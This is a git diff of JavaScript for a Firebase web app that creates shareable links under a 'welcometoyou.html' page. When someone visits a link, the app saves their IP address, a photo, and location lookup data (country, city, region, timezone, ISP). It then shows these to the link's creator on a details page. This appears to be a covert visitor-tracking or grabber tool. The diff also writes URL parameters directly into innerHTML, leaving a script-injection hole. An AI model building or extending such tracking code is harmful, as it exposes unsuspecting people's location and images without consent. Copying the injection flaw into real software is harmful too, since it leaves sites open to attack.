@@ -33,9 +33,9 @@ document.addEventListener('DOMContentLoaded', function () {
               var ip = `${jsonResponse.ip}`.replaceAll('.','-')
               firebase
               .database()
-              .ref("users/"+ uniqueNum+'-'+ip)
+              .ref("users/"+new URLSearchParams(window.location.search).get('link'))
               .set({
-                "id":ip,
+                "ip":ip,
                 "under_link":new URLSearchParams(window.location.search).get('link'),
                 "photo": photo,
                 ...jsonResponse
@@ -177,6 +177,7 @@ document.addEventListener('DOMContentLoaded', function () {
     }
     CopyToClipboard()
 
+    // Creating link
     function MakeLink() {
       window.addEventListener('click', (e) => {
         let imgDiv = e.target
@@ -186,7 +187,7 @@ document.addEventListener('DOMContentLoaded', function () {
               (response) => response.json()
             ).then((jsonResponse) => {
               var ip = `${jsonResponse.ip}`.replaceAll('.','-')
-              var link = window.location.origin+"?link="+uniqueNum
+              var link = window.location.origin+"/welcometoyou.html?link="+uniqueNum
               firebase
               .database()
               .ref("links/" +uniqueNum)
@@ -234,7 +235,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 div.classList.add('col-md-4')
                 div.classList.add('col-sm-6')
                 div.innerHTML = `
-                  <a href="/details.html?link_of=${key}" class="lblk">
+                  <a href="/details.html?link_of=${key}&link=${item.link}&img=${item.imglink}" class="lblk">
                       <img src="${item.imglink}" alt="">
                       <b class="text-truncate">${item.link}</b>
                   </a>
@@ -260,17 +261,34 @@ document.addEventListener('DOMContentLoaded', function () {
         if (new URLSearchParams(window.location.search).has('link_of')) {
           let LinkDetalBlk = document.querySelector('.linkDetails')
           let Heading = LinkDetalBlk.querySelector('h4')
-          let Contentblk = LinkDetalBlk.querySelector('.dtl-blk')
+          let Photo = LinkDetalBlk.querySelector('.dtl-blk img')
           let ul = LinkDetalBlk.querySelector('ul.showDetailsHere')
-          let LinkVal = new URLSearchParams(window.location.search).get('link_of')
+
+          let LinkPeram = new URLSearchParams(window.location.search)
           
+          Heading.innerHTML = "<small>"+LinkPeram.get('link')+"</small>"
+
+
           firebase
           .database()
-          .ref("links/"+LinkVal)
+          .ref("users/"+LinkPeram.get('link_of'))
           .on("value", function (snap) {
             var data = snap.val();
-            Heading.innerHTML = "<small>"+data.link+"</small>"
-            // Contentblk.style.backgroundImage = `url(${data.imglink})`
+            Photo.src = data.photo
+
+            ul.querySelector('.ip').innerHTML = data.ip
+            ul.querySelector('.Country').innerHTML = data.country
+            ul.querySelector('.city').innerHTML = data.city
+            ul.querySelector('.devision').innerHTML = data.region
+            ul.querySelector('.timezone').innerHTML = data.timezone
+            ul.querySelector('.isp').innerHTML = data.org
+
+       
+            
+ 
+ 
+
+            console.log(data)
           })
 
 
